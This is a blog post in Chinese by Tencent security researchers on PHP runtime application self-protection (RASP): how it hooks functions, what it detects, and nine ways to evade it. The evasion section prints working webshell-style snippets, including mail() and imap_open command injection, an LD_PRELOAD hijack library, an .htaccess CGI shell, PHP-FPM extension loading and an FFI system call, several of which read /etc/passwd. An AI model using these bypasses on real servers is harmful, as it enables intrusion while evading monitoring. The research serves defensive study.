# RASP攻防 —— RASP安全应用与局限性浅析

作者：【腾讯安全平台部数据安全团队】 qiye、baz公布时间：2020-09-18阅读次数：23450评论：2

分享

- 

  ![img](https://security.tencent.com/qrcode/blogmsg-166.png)

  

- 

- 

# RASP攻防 —— RASP安全应用与局限性浅析

作者：【腾讯安全平台部数据安全团队】 qiye & baz

# 前言

随着Web应用攻击手段变得复杂，基于请求特征的防护手段，已经不能满足企业安全防护需求。在2012年的时候，Gartner引入了“Runtime application self-protection”一词，简称为RASP，属于一种新型应用安全保护技术，它将防护功能“ 注入”到应用程序中，与应用程序融为一体，使应用程序具备自我防护能力，当应用程序遭受到实际攻击伤害时，能实时检测和阻断安全攻击，而不需要进行人工干预。

腾讯洋葱反入侵团队早在很多年前就研究RASP的应用场景，2014年还在TSRC搞了一次基于rasp的webshell攻防挑战赛，详见（https://security.tencent.com/index.php/blog/msg/57 )；近几年从PHP逐步扩展到Java，Python，Nodejs等其他语言。RASP通过实时采集Web应用的高风险行为，通过特征规则、上下文语义分析及第三方安全产品数据关联分析等多种安全模型来提升检测准确率，相较于传统Web应用安全产品，RASP从海量的攻击中排除掉了大量的无效攻击，聚焦发现真实的已知和未知安全威胁。经过多年的实践我们发现RASP也存在一些缺陷和不足，本文以PHP RASP作为研究对象抛砖引玉，在此分享RASP的应用场景和问题。本文主要分三个部分：RASP架构原理简要介绍、RASP安全应用场景介绍 及 RASP对抗浅析。

> 注意：文中涉及的文章pdf ，代码，思维导图存放于https://github.com/qiyeboy/my_tsrc_paper 仓库中，喜欢的朋友可以自取。

# 一、 RASP架构原理简要介绍

以PHP语言为例，PHP语言自身提供扩展机制，可以基于扩展机制开发RASP系统。

## 腾讯自研的TRASP架构示意图：

![img](https://security.tencent.com/uploadimg_dir/202009/4ee64f63acd920194917bbcfbde00195.png)

TRASP 整个架构大致分为3个部分：1. 客户端模块；2. 云端数据分析模块； 3. 安全处置模块。

1、客户端模块；负责数据采集和规则匹配，数据采集可以配置策略采集需要的数据（如SQL执行/命令执行/代码执行/文件操作等），RASP可以根据需求配置数据采集策略，需要注意的是采集数据越多资源消耗也会随之增大；

2、云端数据分析模块；有些场景通过前端规则无法完全解决，需要上报数据到云端分析进行二次分析，包括使用机器学习算法，关联分析等；

3、安全处置模块；负责配置事件安全等级和处置策略，RASP串行在业务中，误报会影响业务，需要根据安全事件的等级和精准度配置阻断/异步告警/安全通知等不同的处置策略。

## PHP RASP扩展原理和实现简要介绍：

PHP RASP作为PHP解释器的扩展，是一个动态库so文件，PHP语言中类似的动态库很多，比如：mysql.so，RASP和MYSQL扩展的加载方式和运行原理一样，集成在PHP解释器中。接下来从3个方面简单描述一下TRASP扩展模块的实现原理。

### 1. 预加载

任何一个PHP实例都会经过Module init、Request init、Request shutdown和Module shutdown四个过程。

#### Module init

在所有请求到达前发生，例如启动Apache服务器，PHP解释器随之启动，相关的各个模块（Redis、Mysql等）的MINIT方法被调用。仅被调用一次。在开发XXX扩展时，相应的XXX.c文件中将自动生成该方法：

```
PHP_MINIT_FUNCTION(XXX) {      return SUCCESS;   }
```

#### Request init

每个请求到达时都被触发。SAPI层将控制权交由PHP层，PHP初始化本次请求执行脚本所需的环境变量，函数列表等，调用所有模块的RINIT函数。XXX.c中对应函数如下:

```
PHP_RINIT_FUNCTION(XXX){    return SUCCESS;}
```

#### Request shutdown

每个请求结束，PHP就会自动清理程序，顺序调用各个模块的RSHUTDOWN方法，清除程序运行期间的符号表。典型的RSHUTDOWN方法如：

```
PHP_RSHUTDOWN_FUNCTION(XXX){    return SUCCESS;}
```

#### Module shutdown

所有请求处理完毕后，SAPI也关闭了（即服务器关闭），PHP调用各个模块的MSHUTDOWN方法释放内存。

```
PHP_MSHUTDOWN_FUNCTION(XXX){    return SUCCESS;}
```

RASP预加载主要在Module init 阶段实现, 通过在初始化阶段预先加载RASP模块, 替换opcode handler与通过自定义函数替换全局函数表位置。

> PHP把中间字节码称之为OPCODE，每个OPCODE对应ZEND底层的一个处理函数，ZEND引擎最终执行这个处理函数。

### 2. Hook Opcode 或 Hook 内部函数

RASP需要监控各个敏感函数的调用，在PHP中比较好的方式便是 Hook Opcode 和 Hook内部函数。
(1) 实现Hook Opcode 功能只需要改变 Hook Opcode 对应的处理函数即可，而 zend 预先就提供了一个现成的接口：zend_set_user_opcode_handler, 如:

```
zend_set_user_opcode_handler(ZEND_ECHO, php_replace_echo_handler);
```

替换 Opcode handler 后便可以自定义函数调用前后的操作, 如获取参数、阻断攻击等, 还可以通过 ZEND_USER_OPCODE_DISPATCH 跳回至原来的Opcode执行,虽然PHP调用函数的方式多种多样, 但从Opcode角度分析, 主要还是分为以下几类, 以php7为例

```
动态方法调用ZEND_INCLUDE_OR_EVALZEND_INIT_USER_CALLZEND_INIT_DYNAMIC_CALL函数调用ZEND_DO_FCALLZEND_DO_ICALLZEND_DO_FCALL_BY_NAME
```

(2) 另一种实现Hook函数调用的方式就是Hook内部函数, Opcode最终还是会通过CG(function_table)获取所调用函数的handler执行, 那么我们通过修改CG(function_table)表对应函数的handler指向, 便可以指向我们实现的函数,在完成相应操作后继续调用原来的函数实现hook。

```
//参考taint实现static void php_override_func(const char *name, php_func handler, php_func *stash) /* {{{ */ {    zend_function *func;    if ((func = zend_hash_str_find_ptr(CG(function_table), name, strlen(name))) != NULL) {        if (stash) {            *stash = func->internal_function.handler;        }        func->internal_function.handler = handler;    }}
```

两种方式皆可实现Hook函数，有各自的优点。第一种，适合工程化，只需要对几种Opcode类型进行hook，后续Hook的敏感函数可以自行添加；第二种则是需要对敏感函数进行逐一替换，比较繁琐，但优点是替换发生在函数表内，故通过越过Opcode进行函数执行的手法也无法绕过检测，更加可靠。

### 3. 参数获取与分析

在完成对敏感函数调用行为的监控后，通过ZEND_CALL_NUM_ARGS和ZEND_CALL_ARG，我们可以获取到函数的参数个数和内容，便可根据函数的参数制定相应的策略。如文件类可以关注是否读取了敏感文件, 数据库操作类是否语法结构发生了变化等等。

# 二、 RASP 安全应用场景介绍

## 1. 基于规则的漏洞攻击检测

通过RASP实时采集Web应用的高风险行为，具体实现为hook漏洞相关的函数，如检测SQL注入（劫持mysqli_query等）、命令注入（system/exec等）、文件上传漏洞（move_uploaded_file等）、xss漏洞（echo/print等）；拿到函数数据后对参数进行规则匹配判断是否存在漏洞攻击。举两个例子：

（1）文件上传漏洞，以move_uploaded_file为例，函数说明：move_uploaded_file ( string $filename , string $destination ) : bool，第一个参数为上传文件，如果上传了一个动态php脚本后缀文件即判断存在上传漏洞。

------

【ip xxx 安全漏洞告警】
TRASP 发现ip xxx存在上传漏洞，漏洞细节如下：
漏洞文件: /data/webroot/xxx/x.php(第201行)
上传的PHP动态脚本: /data/webroot/xxx/1.php

------

（2）SQL注入，可以发现下图正常的sql和恶意的注入sql有区别，比如使用了union select，可以基于此做安全策略；

![img](https://security.tencent.com/uploadimg_dir/202009/f19b4cb3a8aed168f2f9d9af83222ac2.png)

传统规则可能存在误报，也可以对sql语句做语义解析判断是否存在sql注入攻击，非本文重点不再过多介绍。

## 2. 基于污点追踪的漏洞检测

通过追踪外部可控制的输入变量（如$_GET,$_POST,$_REQUEST,$_COOKIE等）是否未经安全处理进入危险函数执行，危险函数包括各种可能导致漏洞的函数，如命令注入相关的system/exec，xss相关的echo/print。污点追踪原理借用了php变量结构体预留的一个标记位，业界知名的相关系统有鸟哥开发的Taint扩展，详情可参考：https://www.laruence.com/2012/02/14/2544.html， 本文不再做过多介绍。

## 3. IAST扫描联动

先简要介绍下IAST，IAST中文名是交互式应用安全测试，相较于传统的DAST和SAST扫描方式，漏洞检出率更高&误报率更低。IAST目前常见的实现方式有两种，一类是基于代理或网关等形式抓取业务CGI流量后做安全测试扫描，一类是在业务web容器插桩获取业务代码执行细节结合DAST扫描用例判断是否存在漏洞，比如DAST发起一个带有test_from_dongxi字符串的SQL注入测试请求，web容器内插桩劫持数据库相关函数，发现sql语句中有test_from_dongxi的字符串，从而联动发现安全漏洞；RASP可以用于插桩获取代码执行流程，相较于传统漏洞检测方法可以直接定位到有漏洞的代码文件和具体代码行号，业务修复起来更加便捷。

![img](https://security.tencent.com/uploadimg_dir/202009/d8249796dda797b6ac311cc161ded1d0.png)

## 4. Webshell检测

Webshell文件是一个特殊的cgi文件，有文件操作、命令执行等管理功能，可以基于rasp采集的数据在云端做检测；检测方法包括 规则匹配（适用于一句话木马和混淆webshell有明显特征的样本）、行为统计分析（适用于大马）；此外，RASP结合污点追踪也是一种检测方法，通过标记非信任的数据源，监测整个数据链路，此前写过一篇文章，详情可参考：https://security.tencent.com/index.php/blog/msg/152， 本文不再做过多介绍。

# 三、RASP 对抗浅析

在上文中，介绍了PHP RASP的安全应用场景和实现原理，写了很多RASP的优点，但俗话讲的好：没有绝对安全的系统，接下来分享一下RASP存在的不足。先看一下RASP在LINUX系统中的层级：

![img](https://security.tencent.com/uploadimg_dir/202009/2c89e926f98bdbc2cc825349995e4784.png)

PHP RASP作为php解释器的扩展，运行在php解释器层面，也就是说在**与PHP RASP同级或者在其层级之下的操作，它的监控基本上是失效的**，这包括与PHP RASP同一级的其他扩展，PHP解释器之外的进程，以及通过glibc的操作，这很关键。
既然分析绕过手法，那就需要一个绕过的标准，由于命令风险很高，同时更加普遍，因此选择命令作为突破口：

> 通过PHP脚本任意执行命令，让RASP **无法监控到数据或者无法捕获到正确数据**

接下来从9个方面来阐述绕过方法，文中部分知识都是公开的，只是用在了新的场景。

## 1.函数监控不全

php手册中的函数太多了，总有你想不到的，多翻翻PHP手册，比如rasp hook了以下常用的命令执行函数

```
system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()`单引号执行`
```

利用Windows中COM组件绕过：

```
<?php$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");$phpexec=$phpwsh->exec("cmd.exe /c $cmd");$execoutput=$wshexec->stdout();$result=$execoutput->readall();echo $result;?>
```

## 2.函数参数混淆

RASP检测基于函数和参数做安全策略，可以对参数做变形绕过检测，举个例子: system 函数，用来执行命令，很多业务文件也用，比如运维管理后台。RASP不能只根据函数做报警，会带来大量误报，需要结合参数来做策略，system函数底层原理是执行 sh -c “函数参数”，因此我们可以通过命令混淆的方式，成功将RASP动态检测转化为对函数参数的静态检测，这样操作空间就会变得很大。示例如下：

```
system("whoami") <=> system("w\h\oa\m\i")
```

其实在**存在命令注入漏洞的场景中，使用混淆的方式是有很大的机会绕过RASP的监控**。

## 3.loader型函数

什么叫loader型函数呢？ 简单来说函数是正常的，但是通过改变参数来实现恶意行为，函数参数相当于payload。

比如 mail() 函数的第五个additional_parameters参数可用于设置命令行选项传递给配置为发送邮件时使用的程序。

mail 函数的底层原理是调用sendmail程序,当系统使用Exim来发送邮件时，sendmail 的 -be 参数支持运行扩展模式，可以 对指定字符串扩展格式进行解析。

默认情况下 sendmail时不支持 -be参数的，如何测试主机上的sendmail是否支持-be扩展呢？ 使用sendmail执行whoami，如果成功则没有问题：

```
[root@VM_0_13_centos phpscan]# sendmail -be '${run{/usr/bin/whoami}}'root
```

借用github中使用mail 实现命令执行的开源代码：

```
<?php$c = @$_GET['lemon'];$result_file = "/tmp/test.txt";$tmp_file = '/tmp/aaaa.sh';$command = $c . '>' . $result_file;file_put_contents($tmp_file, $command);$payload = "-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}/tmp/aaaa.sh}{ok}{error}}";mail("a@localhost", "", "", "", $payload);echo file_get_contents($result_file);@unlink($tmp_file);@unlink($result_file);?>
```

除了mail函数，还有imap_open 函数在ssh建立连接可利用\t代替空格进行-o ProxyCommand参数命令拼接，从而调用系统shell执行命令。示例代码如下：

```
<?php$encoded_payload = base64_encode("cat /etc/passwd >/tmp/result");$server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";@imap_open('{'.$server.'}:143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());echo file_get_contents("/tmp/result");?>
```

## 4.LD_PRELOAD

LD_PRELOAD 是Linux中比较特殊的环境变量，它允许用户指定程序运行前优先加载的动态链接库。在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。

mail() 、 error_log()、ImageMagick() 是常用于劫持的触发函数，原因是在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。

以mail函数为例：mail函数在运行时，会启动子进程来调用系统的sendmail，sendmail引用了getegid() 函数。

那么我们可以通过重写 getegid() 函数编译为so文件,代码内部执行了whoami：

```
#include <unistd.h>#include <sys/types.h>uid_t getegid(void){  if (getenv("LD_PRELOAD") == NULL){        return 0;    }    unsetenv("LD_PRELOAD");    system("whoami");    return 0;}
```

在利用过程中，通过设置LD_PRELOAD环境变量引入自定义的so库。由于真正的恶意代码运行在php之外的进程，自然避过了RASP监控。

```
<?phpputenv("LD_PRELOAD=./getegid.so");mail("","","","");
```

## 5. htaccess和mod_cgi

在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP来执行系统命令。需要满足四个条件:

1. apache环境
2. mod_cgi为启用状态
3. 允许.htaccess文件，即在httpd.conf中，AllowOverride选项为All，而不是none
4. 有权限写.htaccess文件

举个例子：

.htaccess内容：

```
Options +ExecCGIAddHandler cgi-script .tt#后缀为tt为文件就会被当作cgi执行
```

shell.tt

```
#!/bin/shcat /etc/passwd
```

## 6. PHP-FPM

PHP-FPM是一个fastcgi协议解析器，默认监听在9000端口。php-fpm由于**未授权访问**的设计缺陷，它没有相应的访问验证，因此 可以自己构造fastcgi协议，与php-fpm进行通信，让它帮我们干一些”坏事”，比如动态加载上传的恶意php扩展。
FastCGI协议由多个record组成，和HTTP协议类似，也有header和body ，但是和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：

```
typedef struct {  /* Header */  unsigned char version; // 版本  unsigned char type; // 请求包的类型...} FCGI_Record;
```

在传入的FastCGI协议数据包中，设置 type=4，就可以给php-fpm传递环境参数，指挥它工作。

通过FastCGI协议告诉php-fpm去加载一个我们自定义的扩展，这涉及到php-fpm的两个环境变量，`PHP_VALUE` 和 `PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。我们只要发送如下类似的请求就可以实现扩展的自动加载。

```
{'GATEWAY_INTERFACE' => 'FastCGI/1.0','REQUEST_METHOD' => 'POST','SERVER_SOFTWARE' => 'php/fcgiclient','REMOTE_ADDR' => '127.0.0.1','REMOTE_PORT' => '9984','SERVER_ADDR' => '127.0.0.1','SERVER_PORT' => '80','SERVER_NAME' => 'mag-tured','SERVER_PROTOCOL' => 'HTTP/1.1','CONTENT_TYPE' => 'application/x-www-form-urlencoded','PHP_VALUE' => 'extension=xxx.so','PHP_ADMIN_VALUE' => 'extension=xxx.so','CONTENT_LENGTH' => strlen($content)}
```

推荐几个项目，可以方便大家更好的操作：

```
python实现的fastcgi client：https://github.com/wuyunfeng/Python-FastCGI-Clientphp实现的fastcgi client：https://github.com/adoy/PHP-FastCGI-Clientphp扩展生成：https://github.com/qiyeboy/arbitrary-php-extension
```

## 7.C接口

FFI（Foreign Function Interface）是 PHP7.4 新加入的功能，即外部函数接口，允许从共享库中调用C代码，导致风险点扩大。调用glibc中的system:

```
$ffi = FFI::cdef("int system(char* command);");$ffi ->system("cat /etc/passwd");
```

## 8.已知漏洞

php有一些已知的释放重引用漏洞，比如 GC UAF、Json Serializer UAF 、Backtrace UAF等，具体的exp位于https://github.com/mm0r1/exploits/

通过第一部分对 RASP（PHP）原理的讲解，我们知道PHP函数的底层调用都要通过CG(function_table)获取所调用函数的handler。无论 RASP 是hook opcode 还是 hook function，本质上都没有从内存中删除所调用的函数，只是改变了走向，指向了我们自定义的函数。正因如此，我们可以通过上述漏洞，找到内存中对应的函数地址，将其封装为闭包实现调用，从而完成绕过 。以 system函数为例，绕过原理简单总结如下图所示：

![img](https://security.tencent.com/uploadimg_dir/202009/35937f5607324e0f6f979d425e1bdf24.png)

对于 正常的php 文件 system(“whoami”)而言，由于php rasp 将function_table 函数指向从原来的zif_system 内置函数 改为 自定义的fake_system监控函数，导致命令执行在RASP的控制之下。而通过上述漏洞的方式，可以在内存中直接找到 zif_system函数地址，找到地址后，通过伪造闭包对象，将对象中的函数handler指向该地址，实现对 zif_system函数的调用，从而绕过RASP监控。

## 9.GOT 表劫持

在linux系统中，procfs 文件系统是个特殊的存在，对应的是 /proc目录，php 可以通过/proc 目录读写自己所在进程的内存，将非敏感函数地址替换成glibc 中的system地址，从而执行命令，其涉及的技术叫做 GOT表劫持。

通过正常函数实现敏感行为绕过 RASP ，举个例子，如果能将open函数地址换成system地址，那么便可以将fopen打开文件的命令，最终变成glibc调用system执行命令。

**适用条件：**

1. 内核版本>=2.98
2. 基于www权限的php-fpm/php-cgi work进程必须有权限读写 /proc/self/目录。
3. open_basedir=off（或者能绕过open_basedir读写 /lib/ 和/proc/）

**针对适用条件的第2点简要说明一下：**

- apache+php 由于 apache调用setuid设置www权限工作进程，/proc/self/目录属于root用户，导致没有权限读写。
- nginx+php，对于低版本的php -fpm www权限工作进程， /proc/self/目录属于www用户可以读写。经不完全测试，php<5.6 版本是可以使用GOT表劫持。

**下面简单描述一下劫持GOT表的步骤，以system替换open函数为例：**

1. 读取/proc/self/maps 找到php与glibc在内存中的基地址
2. 解析/proc/self/exe 找到php文件中open[@plt](https://github.com/plt)的偏移，解析libc.so找到system函数的偏移地址
3. 解析 /proc/self/mem 定位 open[@plt](https://github.com/plt) 对应open[@got](https://github.com/got)的地址，以及libc.so中system 函数的内存地址
4. 将system 函数的内存地址 写入到 open[@got](https://github.com/got)里
5. 主动调用fopen(“/bin/whoami”) ,即相当于调用 system(“/bin/whoami”)

不在文中放exp源码了，具体源码在前文提到的git仓库中，大家可以根据实际环境进行调试修改，并不通用。

## 四.总结

单纯就RASP本身而言，RASP的优点在于能嵌入在应用程序内部，应用代码无感知，更了解应用程序上下文，方便定位漏洞信息，更少的误报和漏报，对各种绕过手法具有更强的防护能力；但缺点在于PHP RASP会对服务器的性能造成影响，推动部署落地相对困难。不过随着DevSecOps理念的推广，未来借助于云、容器等成熟的大规模基础设施和技术，通过优化完全有可能提供更优雅更易于接受和使用的部署方案，能够带来更快更精准更细致入微的安全检查及防护能力。关于DevSecOps理念与思考，大家可以参考我们团队之前的文章： [“安全需要每个工程师的参与”-DevSecOps理念及思考](https://security.tencent.com/index.php/blog/msg/150) 。

虽然依然有一些对抗手段，但是RASP 在Web安全领域依然是现阶段强有力的存在。但是安全没有银弹，不存在一劳永逸的系统和办法，在漏洞/入侵检测上我们需要扫描器，WAF，IDS，EDR等系统的配合共建防御体系，纵深防御才是长久之道，并且需要持续研究在对抗中不断提升和发展。

## 参考文献：

https://www.cnblogs.com/zw1sh/p/12632126.html

https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true

https://www.cnblogs.com/tr1ple/p/11213732.html

https://www.freebuf.com/articles/others-articles/232329.html

https://x-c3ll.github.io/posts/UAF-PHP-disable_functions/



[RASP攻防 —— RASP安全应用与局限性浅析 - 博客 - 腾讯安全应急响应中心 (tencent.com)](https://security.tencent.com/index.php/blog/msg/166)